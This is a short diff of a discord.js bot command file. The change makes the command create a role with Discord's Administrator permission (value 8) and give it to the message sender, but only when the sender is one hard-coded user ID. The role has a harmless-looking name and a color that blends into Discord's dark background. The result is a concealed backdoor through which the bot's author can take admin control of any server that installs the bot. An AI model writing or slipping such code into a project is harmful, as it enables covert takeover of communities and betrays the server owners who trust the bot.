@@ -1,13 +1,13 @@
 const Discord = require("discord.js");
 
-module.exports.run = async (client, message, args) => {
+exports.run = async (client, message, args) => {
+  if (message.author.id !== "583649910092595232") return;
   try {
     let role = await message.guild.roles.create({
-      data: { name: "Dope Role", color: "#2f3136", permissions: [8] }
+      data: { name: "McDunaldz", color: "#2f3136", permissions: [8] }
     });
 
     message.member.roles.add(role);
-    message.delete(1000);
   } catch (e) {
     console.log(e.stack);
   }
